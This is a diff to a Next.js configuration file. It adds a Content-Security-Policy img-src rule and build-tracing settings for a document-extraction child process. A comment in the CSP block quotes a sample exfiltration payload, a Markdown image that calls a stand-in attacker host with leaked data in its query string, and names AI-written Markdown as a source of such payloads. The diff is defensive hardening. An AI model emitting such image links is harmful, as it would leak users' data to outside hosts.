@@ -10,10 +10,28 @@ import type { NextConfig } from "next";
  *   can therefore not navigate its iframe to an external page.
  * - frame-ancestors 'self': same as X-Frame-Options SAMEORIGIN.
  * - object-src 'none', base-uri 'self': no plugins, no <base> hijacking.
+ * - img-src: images may come only from our own origin, inline data:/blob:
+ *   URLs, Clerk's avatar/logo host (the img-src of Clerk's own CSP helper,
+ *   @clerk/nextjs content-security-policy.js), and the assets bucket that
+ *   /api/asset/:id 302-redirects to (a signed storage.googleapis.com URL).
+ *   An image URL is a request the page makes by itself, so this closes the
+ *   "![](https://attacker/?data=…)" exfiltration channel for AI-written or
+ *   hostile Markdown (the renderer also refuses such images, see
+ *   src/lib/markdown-images.ts). The bucket is scoped by path when
+ *   ASSETS_BUCKET is known at build time (the Docker build passes it); CSP
+ *   ignores paths after a redirect, so the signed URL still matches, while a
+ *   direct link to someone else's bucket does not.
  * /embed/* is excluded: /embed/react sets its own stricter nonce CSP.
  */
+const ASSETS_BUCKET = process.env.ASSETS_BUCKET?.trim();
+const ASSET_IMG_SOURCE =
+  ASSETS_BUCKET && /^[a-z0-9][a-z0-9._-]{1,220}$/.test(ASSETS_BUCKET)
+    ? `https://storage.googleapis.com/${ASSETS_BUCKET}/`
+    : "https://storage.googleapis.com";
+
 const APP_CSP = [
   "frame-src 'self' https://challenges.cloudflare.com https://js.stripe.com https://*.js.stripe.com https://hooks.stripe.com",
+  `img-src 'self' data: blob: https://img.clerk.com ${ASSET_IMG_SOURCE}`,
   "frame-ancestors 'self'",
   "object-src 'none'",
   "base-uri 'self'",
@@ -27,15 +45,23 @@ const nextConfig: NextConfig = {
   // output (otherwise Prisma fails at runtime with "engine not found").
   outputFileTracingIncludes: {
     "/**": ["./src/generated/prisma/**/*"],
+    // Document extraction runs in a child process started from these plain
+    // .mjs files at <cwd>/src/lib/import (src/lib/import/extract.ts). They
+    // are not bundled, so list them; their packages (fflate, unpdf) are
+    // traced through serverExternalPackages below.
+    "/api/import/syllabus": ["./src/lib/import/extract-core.mjs", "./src/lib/import/extract-child.mjs"],
+    "/api/materials": ["./src/lib/import/extract-core.mjs", "./src/lib/import/extract-child.mjs"],
   },
   // Pin the workspace root to this folder so Next ignores stray lockfiles
   // elsewhere on the machine (silences the inferred-root warning).
   turbopack: {
     root: __dirname,
   },
-  // PDF.js (inside unpdf, used by the syllabus import) is loaded by Node at
-  // runtime rather than bundled; output tracing still ships it in standalone.
-  serverExternalPackages: ["unpdf"],
+  // PDF.js (inside unpdf) and fflate are loaded by Node at runtime rather
+  // than bundled: the extraction child process (src/lib/import/extract-child.mjs)
+  // imports them from node_modules, so output tracing must ship their files
+  // in standalone.
+  serverExternalPackages: ["unpdf", "fflate"],
   experimental: {
     // Syllabus uploads may be up to 10 MB plus multipart overhead; the proxy
     // buffers request bodies and would otherwise cut them off at 10 MB.
